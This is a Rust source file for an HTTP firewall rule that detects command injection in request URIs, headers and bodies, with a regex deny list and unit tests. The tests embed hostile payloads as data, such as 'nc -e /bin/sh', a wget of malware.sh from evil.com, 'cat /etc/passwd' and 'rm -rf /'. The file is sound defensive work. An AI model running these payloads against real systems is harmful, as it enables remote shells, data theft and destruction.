use super::{SecurityRule, SecurityViolation, ThreatLevel};
use once_cell::sync::Lazy;
use pingora::http::RequestHeader;
use regex::Regex;
use std::collections::HashSet;

/// Command injection attack patterns
/// Detects attempts to execute shell commands
static COMMAND_INJECTION_PATTERNS: Lazy<Vec<Regex>> = Lazy::new(|| {
    vec![
        // Command chaining operators
        Regex::new(r";\s*\w").unwrap(),    // ; command
        Regex::new(r"\|\s*\w").unwrap(),   // | command (pipe)
        Regex::new(r"\|\|\s*\w").unwrap(), // || command (or)
        Regex::new(r"&&\s*\w").unwrap(),   // && command (and)
        Regex::new(r"\n\s*\w").unwrap(),   // newline command
        // Command substitution
        Regex::new(r"\$\(\s*\w").unwrap(), // $(command)
        Regex::new(r"`[^`]+`").unwrap(),   // `command` (backticks)
        Regex::new(r"\$\{\s*\w").unwrap(), // ${variable}
        // Shell redirections
        Regex::new(r">\s*/").unwrap(),  // > /path
        Regex::new(r">>\s*/").unwrap(), // >> /path
        Regex::new(r"<\s*/").unwrap(),  // < /path
        Regex::new(r"2>&1").unwrap(),   // stderr redirect
        // Common dangerous commands
        Regex::new(r"(?i)\b(cat|head|tail|less|more)\s+/").unwrap(),
        Regex::new(r"(?i)\b(ls|dir)\s+(-\w+\s+)?/").unwrap(),
        Regex::new(r"(?i)\b(rm|del|rmdir)\s+(-\w+\s+)?").unwrap(),
        Regex::new(r"(?i)\b(wget|curl)\s+").unwrap(),
        Regex::new(r"(?i)\b(nc|netcat|ncat)\s+").unwrap(),
        Regex::new(r"(?i)\b(bash|sh|zsh|ksh|csh)\s+-").unwrap(),
        Regex::new(r"(?i)\b(python|perl|ruby|php)\s+-").unwrap(),
        Regex::new(r"(?i)\b(chmod|chown|chgrp)\s+").unwrap(),
        Regex::new(r"(?i)\bsudo\s+").unwrap(),
        Regex::new(r"(?i)\b(kill|killall|pkill)\s+").unwrap(),
        Regex::new(r"(?i)\b(whoami|id|uname)\b").unwrap(),
        Regex::new(r"(?i)\b(passwd|useradd|userdel)\b").unwrap(),
        Regex::new(r"(?i)\b(ifconfig|ipconfig|netstat)\b").unwrap(),
        Regex::new(r"(?i)\bping\s+-").unwrap(),
        // Shell paths
        Regex::new(r"(?i)/bin/(sh|bash|zsh|ksh|csh|dash)").unwrap(),
        Regex::new(r"(?i)/usr/bin/(sh|bash|python|perl|ruby|php)").unwrap(),
        Regex::new(r"(?i)cmd\.exe").unwrap(),
        Regex::new(r"(?i)powershell").unwrap(),
        // Environment variable access
        Regex::new(r"\$PATH\b").unwrap(),
        Regex::new(r"\$HOME\b").unwrap(),
        Regex::new(r"\$USER\b").unwrap(),
        Regex::new(r"\$SHELL\b").unwrap(),
        Regex::new(r"(?i)%systemroot%").unwrap(),
        Regex::new(r"(?i)%comspec%").unwrap(),
        // Encoded variants
        Regex::new(r"(?i)%3b").unwrap(),    // ; encoded
        Regex::new(r"(?i)%7c").unwrap(),    // | encoded
        Regex::new(r"(?i)%26").unwrap(),    // & encoded
        Regex::new(r"(?i)%60").unwrap(),    // ` encoded
        Regex::new(r"(?i)%24%28").unwrap(), // $( encoded
    ]
});

/// Safe headers that should not be checked
static SAFE_HEADERS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    let mut set = HashSet::new();
    set.insert("accept");
    set.insert("accept-encoding");
    set.insert("accept-language");
    set.insert("content-type");
    set.insert("user-agent");
    set.insert("cache-control");
    set.insert("connection");
    set.insert("host");
    set.insert("origin");
    set.insert("referer");
    set.insert("cookie");
    set
});

pub struct CommandInjectionDetector {
    pub enabled: bool,
    pub block_mode: bool,
}

impl CommandInjectionDetector {
    pub fn new(enabled: bool, block_mode: bool) -> Self {
        Self {
            enabled,
            block_mode,
        }
    }

    fn check_string(&self, input: &str) -> Option<String> {
        if input.len() < 2 {
            return None;
        }

        // URL decode first
        let decoded = urlencoding::decode(input).unwrap_or(std::borrow::Cow::Borrowed(input));

        for pattern in COMMAND_INJECTION_PATTERNS.iter() {
            if pattern.is_match(&decoded) || pattern.is_match(input) {
                return Some(format!("Command injection pattern: {}", pattern.as_str()));
            }
        }

        None
    }

    fn is_safe_header(&self, header_name: &str) -> bool {
        SAFE_HEADERS.contains(header_name.to_lowercase().as_str())
    }
}

impl SecurityRule for CommandInjectionDetector {
    fn check(&self, request: &RequestHeader, body: Option<&[u8]>) -> Result<(), SecurityViolation> {
        if !self.enabled {
            return Ok(());
        }

        // Check URI
        let uri = request.uri.to_string();
        if let Some(reason) = self.check_string(&uri) {
            return Err(SecurityViolation {
                threat_type: "COMMAND_INJECTION".to_string(),
                threat_level: ThreatLevel::Critical,
                description: format!("Command injection detected in URI: {} - {}", uri, reason),
                blocked: self.block_mode,
            });
        }

        // Check headers
        for (name, value) in request.headers.iter() {
            let header_name = name.as_str();

            if self.is_safe_header(header_name) {
                continue;
            }

            if let Ok(val) = value.to_str() {
                if let Some(reason) = self.check_string(val) {
                    return Err(SecurityViolation {
                        threat_type: "COMMAND_INJECTION".to_string(),
                        threat_level: ThreatLevel::Critical,
                        description: format!(
                            "Command injection detected in header {}: {}",
                            name, reason
                        ),
                        blocked: self.block_mode,
                    });
                }
            }
        }

        // Check body
        if let Some(body_bytes) = body {
            if let Ok(body_str) = std::str::from_utf8(body_bytes) {
                if let Some(reason) = self.check_string(body_str) {
                    return Err(SecurityViolation {
                        threat_type: "COMMAND_INJECTION".to_string(),
                        threat_level: ThreatLevel::Critical,
                        description: format!(
                            "Command injection detected in request body: {}",
                            reason
                        ),
                        blocked: self.block_mode,
                    });
                }
            }
        }

        Ok(())
    }

    fn name(&self) -> &str {
        "Command Injection Detector"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_request_with_uri(uri: &str) -> RequestHeader {
        RequestHeader::build("GET", uri.as_bytes(), None).unwrap()
    }

    #[test]
    fn test_semicolon_injection() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=test;ls");
        let result = detector.check(&req, None);
        assert!(result.is_err());
        assert_eq!(result.unwrap_err().threat_type, "COMMAND_INJECTION");
    }

    #[test]
    fn test_pipe_injection() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=test%7ccat%20/etc/passwd");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_and_operator() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=test&&whoami");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_or_operator() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=test||id");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_command_substitution_dollar() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/search?q=$(whoami)");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_command_substitution_backtick() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/search?q=`id`");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_redirect_to_file() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=echo%20test%3e/tmp/test");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_shell_path() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?shell=/bin/bash");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_wget_command() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/download?url=http://evil.com%3bwget%20malware.sh");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_curl_command() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/fetch?cmd=curl%20http://evil.com");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_netcat_command() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=nc%20-e%20/bin/sh");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_encoded_semicolon() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=test%3bls");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_encoded_pipe() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=test%7ccat");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_environment_variable() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?path=$PATH");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_powershell() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/exec?cmd=powershell%20-c%20Get-Process");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }

    #[test]
    fn test_normal_request_allowed() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/users/123/profile");
        let result = detector.check(&req, None);
        assert!(result.is_ok());
    }

    #[test]
    fn test_disabled_detector() {
        let detector = CommandInjectionDetector::new(false, true);
        let req = create_request_with_uri("/api/exec?cmd=test;ls");
        let result = detector.check(&req, None);
        assert!(result.is_ok());
    }

    #[test]
    fn test_log_only_mode() {
        let detector = CommandInjectionDetector::new(true, false);
        let req = create_request_with_uri("/api/exec?cmd=test;ls");
        let result = detector.check(&req, None);
        assert!(result.is_err());
        assert!(!result.unwrap_err().blocked);
    }

    #[test]
    fn test_body_injection() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/submit");
        let body = b"command=test;rm -rf /";
        let result = detector.check(&req, Some(body));
        assert!(result.is_err());
    }

    #[test]
    fn test_rm_command() {
        let detector = CommandInjectionDetector::new(true, true);
        let req = create_request_with_uri("/api/clean?file=test%3brm%20-rf%20/tmp");
        let result = detector.check(&req, None);
        assert!(result.is_err());
    }
}
